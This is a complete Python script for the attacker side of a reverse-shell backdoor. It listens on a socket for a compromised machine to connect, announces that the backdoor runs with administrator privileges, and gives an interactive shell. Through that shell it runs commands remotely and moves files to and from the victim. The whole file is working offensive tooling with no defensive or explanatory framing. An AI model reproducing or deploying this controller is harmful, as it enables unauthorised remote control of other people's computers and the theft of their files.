#!/usr/bin/env python3
import argparse
import json
import socket
import base64

class Listner:
    def __init__(self, ip , port):
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listner.bind((ip, port))
        listner.listen(0)
        print("[+] Waiting for Connections...")
        self.con, self.addr = listner.accept()
        print("[+] Connection Success to IP " + str(self.addr[0]) + " on port " + str(self.addr[1]))
        print("[+] Running Backdoor With ADMINISTRATOR PRIVILEGES ;) ")

    def send_plus(self, data):
        json_data = json.dumps(data)
        byte_data = json_data.encode("utf-8")
        self.con.send(byte_data)

    def recv_plus(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.con.recv(1500000).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, data):
        path = "Downloads/" + path
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))
            return "SHELL >>> Download Success!!!"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def remote_execute(self, command):
        self.send_plus(command)
        if command[0] == "exit":
            self.con.close()
            exit()
        return self.recv_plus()

    def full_path(self, command):
        path = ""
        for i in range(1, len(command)):
            path += command[i];
            if i != len(command)-1:
                path += " "
            else:
                break
        return path

    def run(self):
        while True:
            try:
                command = input("\nSHELL >>> ")
                command = command.split(" ")

                if command[0] == "download":
                    print("SHELL >>> Downloading...")
                    result = self.remote_execute(command)
                    path = self.full_path(command)
                    result = self.write_file(path, result)

                elif command[0] == "upload":
                    print("SHELL >>> Uploading...")
                    path = self.full_path(command)
                    data = self.read_file(path)
                    command.append(data.decode("utf-8"))
                    result = self.remote_execute(command)

                else:
                    result = self.remote_execute(command)
            except Exception:
                result = "SHELL >>> Command Execution Failed..."
            print(result)


def get_args():
    args = argparse.ArgumentParser()
    args.add_argument("-ip", dest="ip", help="IP of the attacker machine.")
    args.add_argument("-p", dest="port", help="Specify the port to the socket")
    options = args.parse_args()
    return options.ip, options.port


ip, port = get_args()
listener = Listner(ip, int(port))
listener.run()